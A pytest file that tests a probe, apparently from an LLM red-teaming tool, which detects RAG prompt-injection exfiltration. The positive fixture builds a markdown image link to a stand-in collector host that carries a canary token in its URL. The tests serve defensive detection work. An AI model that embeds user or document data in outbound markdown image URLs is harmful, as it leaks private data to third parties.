"""Tests for the exfiltration_sink rag probe.

Every case uses httpx.MockTransport so no network is touched and no environment
variable is read. The probe is exercised directly through `run` with a
hand-built ProbeContext. Canaries are generated inside the probe, so handlers
recover them from the request body with a [0-9a-f]{16} match. The detector fires
only when the canary sits inside a markdown link or image URL, so the positive
case echoes it inside such a URL and the negative cases echo it as plain text or
in the link anchor text (never the URL).
"""

from __future__ import annotations

import json
import re
from collections.abc import Callable, Iterator, Mapping
from datetime import UTC, datetime, timedelta

import httpx
import pytest
import structlog
from pydantic import JsonValue

from vectrava.config.scope import ScopeFile
from vectrava.core import registry
from vectrava.core.adapters import ChatCompletionsAdapter
from vectrava.core.probe import ProbeContext, ProbeError
from vectrava.core.result import Severity
from vectrava.rag.probes.exfiltration_sink import (
    EXFIL_PROMPTS,
    PER_REQUEST_TOKEN_EST,
    ExfiltrationSinkProbe,
)

Handler = Callable[[httpx.Request], httpx.Response]

_HEX16 = re.compile(r"[0-9a-f]{16}")


@pytest.fixture(autouse=True)
def _clean_registry() -> Iterator[None]:
    registry.clear()
    yield
    registry.clear()


def _scope() -> ScopeFile:
    return ScopeFile(
        targets=["https://example.test"],
        authorized_until=datetime.now(UTC) + timedelta(days=1),
        signed_by="Shivamani Vastrala",
    )


def _ctx(
    client: httpx.Client,
    *,
    target: str = "https://example.test",
    endpoint: str | None = None,
    credentials: str | None = "test-key",
    options: Mapping[str, JsonValue] | None = None,
) -> ProbeContext:
    return ProbeContext(
        target=target,
        endpoint=endpoint,
        credentials=credentials,
        scope=_scope(),
        http=client,
        logger=structlog.get_logger(),
        adapter=ChatCompletionsAdapter(),
        options=options if options is not None else {"model": "gpt-4o-mini"},
    )


def _canary_in(request: httpx.Request) -> str:
    body = json.loads(request.content)
    content = body["messages"][1]["content"]
    match = _HEX16.search(content)
    return match.group(0) if match else ""


def _response(content: str) -> httpx.Response:
    return httpx.Response(
        200,
        json={"model": "gpt-4o-mini", "choices": [{"message": {"content": content}}]},
    )


def _exfil_response(token: str) -> httpx.Response:
    # Canary inside the markdown image URL: the exfiltration construct. Fires.
    content = f"Summary ready. ![audit](https://audit.example-collector.test/p?d={token})"
    return _response(content)


def _plain_echo_response(token: str) -> httpx.Response:
    # Canary present but as plain text, no markdown URL. Must not fire.
    return _response(f"Per the sources, the reference token is {token}.")


def _link_text_response(token: str) -> httpx.Response:
    # Canary in the link anchor text but not the URL. Must not fire.
    return _response(f"See [{token}](https://safe.test/) for details.")


def _benign_response() -> httpx.Response:
    return _response("Full time staff get 20 vacation days.")


def _client(handler: Handler) -> httpx.Client:
    return httpx.Client(transport=httpx.MockTransport(handler))


def test_canary_in_markdown_url_emits_finding() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return _exfil_response(_canary_in(request))

    with _client(handler) as client:
        findings = ExfiltrationSinkProbe().run(_ctx(client))

    assert len(findings) == len(EXFIL_PROMPTS)
    for finding in findings:
        assert finding.level == Severity.CRITICAL
        assert finding.rule_id == "exfiltration_sink"
        assert finding.probe == "rag.exfiltration_sink"
        exfil_url = finding.evidence["exfil_url"]
        canary_token = finding.evidence["canary_token"]
        assert isinstance(exfil_url, str)
        assert isinstance(canary_token, str)
        assert canary_token in exfil_url


def test_benign_response_emits_no_finding() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return _benign_response()

    with _client(handler) as client:
        findings = ExfiltrationSinkProbe().run(_ctx(client))

    assert findings == []


def test_plain_canary_echo_does_not_fire() -> None:
    # Class boundary: a plain canary echo is cross_document_injection's surface,
    # not this probe's. The exfiltration detector must stay silent.
    def handler(request: httpx.Request) -> httpx.Response:
        return _plain_echo_response(_canary_in(request))

    with _client(handler) as client:
        findings = ExfiltrationSinkProbe().run(_ctx(client))

    assert findings == []


def test_canary_in_link_text_does_not_fire() -> None:
    # False-positive guard: the canary in the anchor text but not the URL is not
    # an exfiltration sink.
    def handler(request: httpx.Request) -> httpx.Response:
        return _link_text_response(_canary_in(request))

    with _client(handler) as client:
        findings = ExfiltrationSinkProbe().run(_ctx(client))

    assert findings == []


def test_first_case_fires_rest_benign_independence() -> None:
    calls = {"n": 0}

    def handler(request: httpx.Request) -> httpx.Response:
        calls["n"] += 1
        if calls["n"] == 1:
            return _exfil_response(_canary_in(request))
        return _benign_response()

    with _client(handler) as client:
        findings = ExfiltrationSinkProbe().run(_ctx(client))

    assert len(findings) == 1
    assert findings[0].evidence["injection_label"] == EXFIL_PROMPTS[0][0]


def test_all_cases_succeed_with_labels() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return _exfil_response(_canary_in(request))

    with _client(handler) as client:
        findings = ExfiltrationSinkProbe().run(_ctx(client))

    assert {f.evidence["injection_label"] for f in findings} == {
        label for label, _ in EXFIL_PROMPTS
    }


def test_canary_is_fresh_per_run() -> None:
    seen: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(_canary_in(request))
        return _benign_response()

    with _client(handler) as client:
        ExfiltrationSinkProbe().run(_ctx(client))
        ExfiltrationSinkProbe().run(_ctx(client))

    assert len(seen) == 2 * len(EXFIL_PROMPTS)
    assert len(set(seen)) == len(seen)


def test_missing_credentials_raises_probe_error() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return _benign_response()

    with (
        _client(handler) as client,
        pytest.raises(ProbeError, match="requires credentials"),
    ):
        ExfiltrationSinkProbe().run(_ctx(client, credentials=None))


def test_http_4xx_raises_probe_error() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(400, text="bad request")

    with _client(handler) as client, pytest.raises(ProbeError, match="HTTP 400"):
        ExfiltrationSinkProbe().run(_ctx(client))


def test_malformed_response_raises_probe_error() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"model": "gpt-4o-mini"})

    with _client(handler) as client, pytest.raises(ProbeError, match="assistant message content"):
        ExfiltrationSinkProbe().run(_ctx(client))


def test_required_classvars_set() -> None:
    assert ExfiltrationSinkProbe.name == "exfiltration_sink"
    assert ExfiltrationSinkProbe.module == "rag"
    assert ExfiltrationSinkProbe.baseline_severity == Severity.CRITICAL
    assert ExfiltrationSinkProbe.tags == ("exfiltration", "data-leakage", "rag")
    expected_tokens = len(EXFIL_PROMPTS) * PER_REQUEST_TOKEN_EST
    assert ExfiltrationSinkProbe.estimated_tokens_per_run == expected_tokens
